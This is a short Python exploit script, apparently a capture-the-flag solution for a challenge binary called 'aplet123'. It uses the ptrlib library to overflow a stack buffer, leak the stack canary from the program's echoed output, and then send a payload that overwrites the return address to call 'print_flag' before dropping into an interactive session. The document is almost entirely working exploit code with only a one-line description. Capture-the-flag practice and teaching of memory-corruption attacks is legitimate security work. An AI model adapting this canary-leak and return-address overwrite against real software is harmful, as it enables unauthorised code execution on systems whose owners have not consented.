"""
Leak a canary, and ret2win (call `print_flag`).
"""

from ptrlib import *

file = "./aplet123"
e = ELF(file)
sock = Process(file)
sock.debug = True

sock.sendlineafter("hello\n", "A"*64+"B"*5+"i'm")
sock.recvuntil("hi ")
canary = u64(b"\x00" + sock.recv(7))
logger.info(f'canary: {canary:x}')

payload = b"X"*64
payload += flat([
    0x1, 
    canary,
    0x1,
    e.symbol("print_flag")
], map=p64)
sock.sendline(payload)
sock.sendline(b"bye")
sock.sh()

